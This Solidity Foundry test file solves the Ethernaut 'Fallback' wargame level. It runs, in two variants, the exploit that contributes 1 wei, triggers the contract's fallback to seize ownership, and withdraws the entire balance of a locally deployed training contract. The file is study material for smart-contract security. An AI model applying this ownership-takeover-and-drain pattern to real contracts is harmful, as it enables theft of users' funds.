// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../../src/ethernaut/01.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;

    address public user = vm.addr(1);
    uint256 public constant STARTING_USER_BALANCE = 1 ether;

    function setUp() public {
        fallbackContract = new Fallback();
        console.log("Fallback contract deployed at: ", address(fallbackContract));
        vm.deal(user, STARTING_USER_BALANCE);
    }

    function testClaimOwnershipAndWithdraw_1() public {
        assertEq(fallbackContract.owner(), address(this));

        vm.startPrank(user);

        fallbackContract.contribute{value: 1 wei}();

        uint256 contribution = fallbackContract.getContribution();
        assertEq(contribution, 1 wei);

        (bool sent,) = address(fallbackContract).call{value: 1 wei}("");
        require(sent, "Failed to send Ether");

        assertEq(fallbackContract.owner(), user);

        fallbackContract.withdraw();

        assertEq(address(fallbackContract).balance, 0 ether);

        vm.stopPrank();
    }

    function testClaimOwnershipAndWithdraw_2() public {
        assertEq(fallbackContract.owner(), address(this));

        vm.startPrank(user);

        (bool sent,) = address(fallbackContract).call{value: 1 wei}(abi.encodeWithSignature("contribute()"));
        require(sent, "Failed to send Ether");

        (bool success, bytes memory data) = address(fallbackContract).call(abi.encodeWithSignature("getContribution()"));
        // bytes4 getContributionSelector = fallbackContract
        //     .getContribution
        //     .selector;
        // (bool success, bytes memory data) = address(fallbackContract).call(
        //     abi.encodeWithSelector(getContributionSelector)
        // );

        require(success, "Failed to call getContribution");

        // Decode the returned data as uint256
        uint256 contribution = abi.decode(data, (uint256));

        assertEq(contribution, 1 wei);

        (bool sent2,) = address(fallbackContract).call{value: 1 wei}("");
        require(sent2, "Failed to send Ether_2");

        assertEq(fallbackContract.owner(), user);

        (bool success2,) = address(fallbackContract).call(abi.encodeWithSignature("withdraw()"));
        // bytes4 withdrawSelector = fallbackContract.withdraw.selector;
        // (bool success2, ) = address(fallbackContract).call(
        //     abi.encodeWithSelector(withdrawSelector)
        // );

        require(success2, "Failed to call withdraw");

        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0 ether);
    }
}
